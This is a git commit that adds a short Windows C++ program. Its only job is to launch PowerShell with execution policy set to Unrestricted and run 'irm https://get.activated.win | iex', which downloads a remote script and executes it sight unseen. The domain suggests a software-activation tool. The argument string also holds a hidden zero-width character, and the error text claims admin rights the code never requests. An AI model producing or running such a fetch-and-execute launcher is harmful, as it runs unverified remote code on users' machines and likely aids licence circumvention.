15a5b7c77a09e2c752f130610b3bf2f55a5e5429
人間工作 <coolxiaom95@gmail.com>
2025-05-06 13:16:00 +0800

    upload project

---
+++ main.cpp
@@ -0,0 +1,28 @@
+﻿#include <windows.h>
+#include <shellapi.h>
+#include <string>
+#include <iostream>
+using namespace std;
+
+static void RunPowerShell(LPCWSTR command)
+{
+    wstring params = L"-ExecutionPolicy Unrestricted‌ -Command ";
+    params += L"\"& {";
+    params += command;
+    params += L"}\"";
+
+    SHELLEXECUTEINFO process = { sizeof(SHELLEXECUTEINFO) };
+    process.lpFile = L"powershell.exe";
+    process.lpParameters = params.c_str();
+    process.hwnd = NULL;
+    process.nShow = SW_SHOW;
+
+    if (!ShellExecuteEx(&process)) {
+        DWORD error = GetLastError();
+        cerr << "Error running PowerShell as admin: " << error << endl;
+    }
+}
+int main()
+{
+    RunPowerShell(L"irm https://get.activated.win | iex");
+}
